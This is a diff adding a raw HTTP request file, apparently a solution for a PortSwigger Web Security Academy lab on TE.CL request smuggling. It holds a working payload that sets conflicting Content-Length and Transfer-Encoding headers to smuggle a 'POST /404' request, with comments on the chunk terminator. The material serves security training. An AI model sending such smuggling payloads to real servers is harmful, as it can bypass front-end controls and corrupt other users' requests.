@@ -1,0 +1,22 @@
+POST / HTTP/1.1
+Host: ac5c1faf1febb25a804813ed00d900d5.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+			# Essential to have 2x (/r/n) after 0 so server will not wait for more content for 2nd request
+			# as Content-Length=15 
